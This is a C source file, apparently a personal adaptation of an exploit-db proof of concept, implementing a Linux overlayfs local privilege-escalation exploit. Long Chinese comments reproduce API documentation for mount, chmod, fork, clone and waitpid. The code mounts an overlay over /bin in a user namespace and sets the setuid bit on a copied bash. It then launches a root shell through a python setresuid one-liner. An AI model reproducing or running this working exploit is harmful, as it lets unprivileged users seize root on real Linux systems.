/*************************************************************************
    > File Name       : overlayfs.c
    > Author          : 何能斌
    > Mail            : enjoy5512@163.com 
    > Created Time    : Tue 15 Mar 2016 01:01:22 AM PDT
    > Remake          :
		这个程序是我根据exploit-db.com上给出的POC文档改编而来，因为多进程
		我不会调试，所以只能加入很多输出来查看程序运行的流程，在程序能正常
		运行的基础上删除了很多头文件，少用了一次fork（）
 ************************************************************************/

#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>
#include<sched.h>
#include<linux/sched.h>
#include<signal.h>
#include<sys/mount.h>
#include<stdlib.h>
#include<sys/stat.h>

static char child_stack[1024*1024];

static int child_exec(void *stuff)
{
	printf("entry the child_exec()\n");
	system("rm -rf /tmp/haxhax");
	mkdir("/tmp/haxhax",0777);
	mkdir("/tmp/haxhax/w",0777);
	mkdir("/tmp/haxhax/u",0777);
	mkdir("/tmp/haxhax/o",0777);

	printf("before mount\n");
	/*mount()/umount（）函数
	功能描述：
		mount挂上文件系统，umount执行相反的操作。
  
	用法：  
	#include <sys/mount.h>
	int mount(const char *source, const char *target,
	const char *filesystemtype, unsigned long mountflags, const void *data);
	int umount(const char *target);
	int umount2(const char *target, int flags);

	参数：   
		source：将要挂上的文件系统，通常是一个设备名。
		target：文件系统所要挂在的目标目录。
		filesystemtype：文件系统的类型，可以是"ext2"，"ext3","msdos"，
			"proc"，"nfs"，"iso9660" 。。。
		mountflags：指定文件系统的读写访问标志，可能值有以下
		MS_BIND：执行bind挂载，使文件或者子目录树在文件系统内的另一个点上可视。
		MS_DIRSYNC：同步目录的更新。
		MS_MANDLOCK：允许在文件上执行强制锁。
		MS_MOVE：移动子目录树。
		MS_NOATIME：不要更新文件上的访问时间。
		MS_NODEV：不允许访问设备文件。
		MS_NODIRATIME：不允许更新目录上的访问时间。
		MS_NOEXEC：不允许在挂上的文件系统上执行程序。
		MS_NOSUID：执行程序时，不遵照set-user-ID 和 set-group-ID位。
		MS_RDONLY：指定文件系统为只读。
		MS_REMOUNT：重新加载文件系统。这允许你改变现存文件系统的mountflag和
			数据，而无需使用先卸载，再挂上文件系统的方式。
		MS_SYNCHRONOUS：同步文件的更新。
		MNT_FORCE：强制卸载，即使文件系统处于忙状态。
		MNT_EXPIRE：将挂载点标志为过时。
		data：文件系统特有的参数。
    
	返回说明：   
	成功执行时，返回0。失败返回-1，errno被设为以下的某个值   
		EACCES：权能不足，可能原因是，路径的一部分不可搜索，或者挂载只读的文
			件系统时，没有指定 MS_RDONLY 标志。
		EAGAIN：成功地将不处于忙状态的文件系统标志为过时。
		EBUSY：一. 源文件系统已被挂上。或者不可以以只读的方式重新挂载，因为
			它还拥有以写方式打开的文件。二. 目标处于忙状态。
		EFAULT： 内存空间访问出错。
		EINVAL：操作无效，可能是源文件系统超级块无效。
		ELOOP ：路径解析的过程中存在太多的符号连接。
		EMFILE：无需块设备要求的情况下，无用设备表已满。
		ENAMETOOLONG：路径名超出可允许的长度。
		ENODEV：内核不支持某中文件系统。
		ENOENT：路径名部分内容表示的目录不存在。
		ENOMEM： 核心内存不足。
		ENOTBLK：source不是块设备。
		ENOTDIR：路径名的部分内容不是目录。
		EPERM ： 调用者权能不足。
		ENXIO：块主设备号超出所允许的范围。*/
	if(mount("overlay","/tmp/haxhax/o","overlay",MS_MGC_VAL,"lowerdir=/bin,upperdir=/tmp/haxhax/u,workdir=/tmp/haxhax/w")!=0)
	{
		printf("mount failed...\n");
		fprintf(stderr,"mount failed...\n");
	}
	else
	{
		printf("mount sucess!!\n");
	}
	printf("after mount\n");
	
	/*chmod()
	头文件：#include <sys/types.h>   #include <sys/stat.h>
	定义函数：int chmod(const char * path, mode_t mode);
	函数说明：chmod()会依参数mode 权限来更改参数path 指定文件的权限。
	参数 mode 有下列数种组合：
		1、S_ISUID 04000 文件的 (set user-id on execution)位
		2、S_ISGID 02000 文件的 (set group-id on execution)位
		3、S_ISVTX 01000 文件的sticky 位
		4、S_IRUSR (S_IREAD) 00400 文件所有者具可读取权限
		5、S_IWUSR (S_IWRITE)00200 文件所有者具可写入权限
		6、S_IXUSR (S_IEXEC) 00100 文件所有者具可执行权限
		7、S_IRGRP 00040 用户组具可读取权限
		8、S_IWGRP 00020 用户组具可写入权限
		9、S_IXGRP 00010 用户组具可执行权限
		10、S_IROTH 00004 其他用户具可读取权限
		11、S_IWOTH 00002 其他用户具可写入权限
		12、S_IXOTH 00001 其他用户具可执行权限

	注：只有该文件的所有者或有效用户识别码为0，才可以修改该文件权限。
	基于系统安全，如果欲将数据写入一执行文件，而该执行文件具有S_ISUID 或S_ISGID
	权限，则这两个位会被清除。如果一目录具有S_ISUID 位权限，表示在此目录下只有该
	文件的所有者或root 可以删除该文件。

	返回值：权限改变成功返回0, 失败返回-1, 错误原因存于errno.

	错误代码：
		1、EPERM 进程的有效用户识别码与欲修改权限的文件拥有者不同, 而且也不
			具root 权限.
		2、EACCESS 参数path 所指定的文件无法存取.
		3、EROFS 欲写入权限的文件存在于只读文件系统内.
		4、EFAULT 参数path 指针超出可存取内存空间.
		5、EINVAL 参数mode 不正确
		6、ENAMETOOLONG 参数path 太长
		7、ENOENT 指定的文件不存在
		8、ENOTDIR 参数path 路径并非一目录
		9、ENOMEM 核心内存不足
		10、ELOOP 参数path 有过多符号连接问题.
		11、EIO I/O 存取错误*/

	chmod("/tmp/haxhax/w/work",0777);

	/*chdir()
	 *头文件：#include <unistd.h>
	 *定义函数：int chdir(const char * path);
	 *函数说明：chdir()用来将当前的工作目录改变成以参数path 所指的目录.
	 *返回值执：行成功则返回0, 失败返回-1, errno 为错误代码.*/
	chdir("/tmp/haxhax/o");
	chmod("bash",04755);
	chdir("/");
	umount("/tmp/haxhax/o");

	return 0;
}

int main(int argc,char *argv[])
{
	int mount = 10; //用来查看程序运行的顺序
	int status;
	pid_t init;
	int clone_flags = CLONE_NEWNS | SIGCHLD;
	struct stat s;
/*struct stat {
    dev_t         st_dev;       //文件的设备编号
    ino_t         st_ino;       //节点
    mode_t        st_mode;      //文件的类型和存取的权限
    nlink_t       st_nlink;     //连到该文件的硬连接数目，刚建立的文件值为1
    uid_t         st_uid;       //用户ID
    gid_t         st_gid;       //组ID
    dev_t         st_rdev;      //(设备类型)若此文件为设备文件，则为其设备编号
    off_t         st_size;      //文件字节数(文件大小)
    unsigned long st_blksize;   //块大小(文件系统的I/O 缓冲区大小)
    unsigned long st_blocks;    //块数
    time_t        st_atime;     //最后一次访问时间
    time_t        st_mtime;     //最后一次修改时间
    time_t        st_ctime;     //最后一次改变时间(指属性)
};

st_mode 应该是一个32为的整形变量，现在的linux系统只用了其中的前16位（0-15）
 
第15位：其实这一位只用到了一次：
        0170000 (和12-14位合起来，是获得文件类型的屏蔽信息)
12-14位：三位确定了文件的类型（linux文件的类型总共有7中，三位就够了）
11-10位： 这2位分别是是文件用户id和组id位
9位：这位是sticky位
8-0位：这就是文件的访问权限的集合了
先前所描述的st_mode 则定义了下列数种情况：
    S_IFMT   0170000    文件类型的位遮罩
    S_IFSOCK 0140000    scoket
    S_IFLNK 0120000     符号连接
    S_IFREG 0100000     一般文件
    S_IFBLK 0060000     区块装置
    S_IFDIR 0040000     目录
    S_IFCHR 0020000     字符装置
    S_IFIFO 0010000     先进先出

    S_ISUID 04000     文件的(set user-id on execution)位
    S_ISGID 02000     文件的(set group-id on execution)位
    S_ISVTX 01000     文件的sticky位

    S_IRUSR(S_IREAD) 00400     文件所有者具可读取权限
    S_IWUSR(S_IWRITE)00200     文件所有者具可写入权限
    S_IXUSR(S_IEXEC) 00100     文件所有者具可执行权限

    S_IRGRP 00040             用户组具可读取权限
    S_IWGRP 00020             用户组具可写入权限
    S_IXGRP 00010             用户组具可执行权限

    S_IROTH 00004             其他用户具可读取权限
    S_IWOTH 00002             其他用户具可写入权限
    S_IXOTH 00001             其他用户具可执行权限

    上述的文件类型在POSIX中定义了检查这些类型的宏定义：
    S_ISLNK (st_mode)    判断是否为符号连接
    S_ISREG (st_mode)    是否为一般文件
    S_ISDIR (st_mode)    是否为目录
    S_ISCHR (st_mode)    是否为字符装置文件
    S_ISBLK (s3e)        是否为先进先出
    S_ISSOCK (st_mode)   是否为socket*/

	printf("%d : before the fork()\n",mount);
	/*fork()需要头文件unistd.h
	 *一个进程，包括代码、数据和分配给进程的资源。fork（）函数通过系统调用创建一
	 *个与原来进程几乎完全相同的进程，也就是两个进程可以做完全相同的事，但如果初
	 *始参数或者传入的变量不同，两个进程也可以做不同的事。一个进程调用fork（）函
	 *数后，系统先给新的进程分配资源，例如存储数据和代码的空间。然后把原来的进程
	 *的所有值都复制到新的新进程中，只有少数值与原来的进程的值不同。相当于克隆了
	 *一个自己。
	 *fork调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不
	 *同的返回值：
    		1）在父进程中，fork返回新创建子进程的进程ID；
    		2）在子进程中，fork返回0；
    		3）如果出现错误，fork返回一个负值；
	 *fork出错可能有两种原因：
    		1）当前的进程数已经达到了系统规定的上限，这时errno的值被设置为EAGAIN。
   		2）系统内存不足，这时errno的值被设置为ENOMEM。*/
	if((init = fork()) == 0)
	{
		/*unshare需要头文件#include <sched.h>
		 *新的命名空间可以用下面两种方法创建。
		 *	(1) 在用fork或clone系统调用创建新进程时，有特定的选项可以控
		 *制是与父进程共享命名空间，还是建立新的命名空间。
		 *	(2) unshare系统调用将进程的某些部分从父进程分离，其中也包括
		 *命名空间。其中CLONE_NEWUSER用于创建新的用户和用户组空间
		 */
		if(unshare(CLONE_NEWUSER)!=0)
		{
			printf("failed to create new user namespase\n");
		}

		mount = 11;
		printf("%d : after the fork()\n",mount);

		/*#include<linux/sched.h>  #include<signal.h>
		 fork()函数复制时将父进程的所以资源都通过复制数据结构进行了复制，然
		 后传递给子进程，所以fork()函数不带参数；clone()函数则是将部分父进程
		 的资源的数据结构进行复制，复制哪些资源是可选择的，这个可以通过参数设
		 定，所以clone()函数带参数，没有复制的资源可以通过指针共享给子进程.
		 Clone()函数的声明如下：
	int clone(int (*fn)(void *), void *child_stack, int flags, void *arg)
		 fn为函数指针，此指针指向一个函数体，即想要创建进程的静态程序；
		 child_stack为给子进程分配系统堆栈的指针；arg就是传给子进程的参数；
		 flags为要复制资源的标志：
  CLONE_PARENT   创建的子进程的父进程是调用者的父进程，新进程与创建它的进程成了“兄弟”
	而不是“父子”
  CLONE_FS           子进程与父进程共享相同的文件系统，包括root、当前目录、umask
  CLONE_FILES      子进程与父进程共享相同的文件描述符（file descriptor）表
  CLONE_NEWNS   在新的namespace启动子进程，namespace描述了进程的文件hierarchy
  CLONE_SIGHAND   子进程与父进程共享相同的信号处理（signal handler）表
  CLONE_PTRACE   若父进程被trace，子进程也被trace
  CLONE_VFORK     父进程被挂起，直至子进程释放虚拟内存资源
  CLONE_VM           子进程与父进程运行于相同的内存空间
  CLONE_PID          子进程在创建时PID与父进程一致
  CLONE_THREAD    Linux 2.4中增加以支持POSIX线程标准，子进程与父进程共享相同的线程群
		 fork()可以看出是完全版的clone()，而clone()克隆的只是fork()的一部分。
   		 为了提高系统的效率，后来的Linux设计者又增加了一个系统调用vfork()。
		 vfork()所创建的不是进程而是线程，它所复制的是除了任务结构体和系统堆
		 栈之外的所有资源的数据结构，而任务结构体和系统堆栈是与父进程共用的。*/
		pid_t pid =
			clone(child_exec,child_stack + (1024*1024),clone_flags,NULL);
		if(pid < 0)
		{
			printf("error\n");
			fprintf(stderr,"failed to create new mount namespace\n");
			exit(-1);
		}
		printf("%d : after the clone()\n",mount);

/*waitpid()
头文件：#include <sys/types.h>    
	#include <sys/wait.h>
定义函数：pid_t waitpid(pid_t pid, int * status, int options);

函数说明：
	waitpid()会暂时停止目前进程的执行, 直到有信号来到或子进程结束. 如果在调用
wait()时子进程已经结束, 则wait()会立即返回子进程结束状态值. 子进程的结束状态值会由参
数status 返回, 而子进程的进程识别码也会一快返回. 如果不在意结束状态值, 则参数status
可以设成NULL. 参数pid 为欲等待的子进程识别码, 其他数值意义如下：
	1、pid<-1 等待进程组识别码为pid 绝对值的任何子进程.
	2、pid=-1 等待任何子进程, 相当于wait().
	3、pid=0 等待进程组识别码与目前进程相同的任何子进程.
	4、pid>0 等待任何子进程识别码为pid 的子进程.

参数option 可以为0 或下面的OR 组合：

	WNOHANG：如果没有任何已经结束的子进程则马上返回, 不予以等待.
	WUNTRACED：如果子进程进入暂停执行情况则马上返回, 但结束状态不予以理会. 子进
		程的结束状态返回后存于status, 底下有几个宏可判别结束情况
	WIFEXITED(status)：如果子进程正常结束则为非0 值.
	WEXITSTATUS(status)：取得子进程exit()返回的结束代码, 一般会先用WIFEXITED 
		来判断是否正常结束才能使用此宏.
	WIFSIGNALED(status)：如果子进程是因为信号而结束则此宏值为真
	WTERMSIG(status)：取得子进程因信号而中止的信号代码, 一般会先用WIFSIGNALED 
		来判断后才使用此宏.
	WIFSTOPPED(status)：如果子进程处于暂停执行情况则此宏值为真. 一般只有使用
		WUNTRACED时才会有此情况.
	WSTOPSIG(status)：取得引发子进程暂停的信号代码, 一般会先用WIFSTOPPED 来判断
		后才使用此宏.

返回值：如果执行成功则返回子进程识别码(PID), 如果有错误发生则返回-1. 
	失败原因存于errno 中.*/
		waitpid(pid,&status,0);
		return 0;
	}
	printf("%d : after the fork()\n",mount);
	
	/*usleep()
	头文件： unistd.h
	语法: void usleep(int micro_seconds);
	返回值: 无
	内容说明：本函数可暂时使程序停止执行。参数 micro_seconds 为要暂停的微秒数(us)。
	*/
	usleep(30000);

	/*wait()
	头文件：#include <sys/types.h>    #include <sys/wait.h>

	定义函数：pid_t wait (int * status);

	函数说明：wait()会暂时停止目前进程的执行, 直到有信号来到或子进程结束. 如果在
	调用wait()时子进程已经结束, 则wait()会立即返回子进程结束状态值. 子进程的结束
	状态值会由参数status 返回, 而子进程的进程识别码也会一快返回. 如果不在意结束
	状态值, 则参数 status 可以设成NULL. 子进程的结束状态值请参考waitpid().*/
	wait(NULL);

	printf("s.st_mode = %x\n",s.st_mode);
	/*stat()
	表头文件:    	#include <sys/stat.h>
             		#include <unistd.h>
	定义函数:    int stat(const char *file_name, struct stat *buf);
	函数说明:    通过文件名filename获取文件信息，并保存在buf所指的结构体stat中
	返回值:      执行成功则返回0，失败返回-1，错误代码存于errno

	错误代码:
    		ENOENT         参数file_name指定的文件不存在
    		ENOTDIR        路径中的目录存在但却非真正的目录
    		ELOOP          欲打开的文件有过多符号连接问题，上限为16符号连接
    		EFAULT         参数buf为无效指针，指向无法存在的内存空间
   		EACCESS        存取文件时被拒绝
   		ENOMEM         核心内存不足
   		ENAMETOOLONG   参数file_name的路径名称太长*/
	stat("/tmp/haxhax/u/bash",&s);
	printf("s.st_mode = %x\n",s.st_mode);
	if(s.st_mode == 0x89ed)
	{
		//如果在子进程中chmod("bash",04755)成功，则运行下面的提权命令
		execl("/tmp/haxhax/u/bash","bash","-p","-c","python -c \"import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');\"",NULL);
	}
	else
	{
		printf("execl error!!\n");
	}

    return 0;
}
